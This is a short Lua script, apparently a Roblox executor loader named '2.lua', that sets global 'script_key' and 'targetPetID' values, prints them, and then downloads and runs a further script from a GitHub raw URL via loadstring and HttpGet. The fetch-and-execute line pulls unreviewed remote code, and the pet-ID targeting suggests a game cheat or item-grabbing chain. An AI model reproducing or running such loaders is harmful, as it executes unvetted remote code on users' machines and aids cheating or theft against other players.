-- 2.lua

-- Ensure script_key and targetPetID are set globally
getgenv().script_key = getgenv().script_key or "default_key"
getgenv().targetPetID = getgenv().targetPetID or 0

-- Print debug information
print("2.lua - Script Key: ", getgenv().script_key)
print("2.lua - Target Pet ID: ", getgenv().targetPetID)

-- Load and execute 3.lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/iu4w/nemesis/main/3.lua", true))()
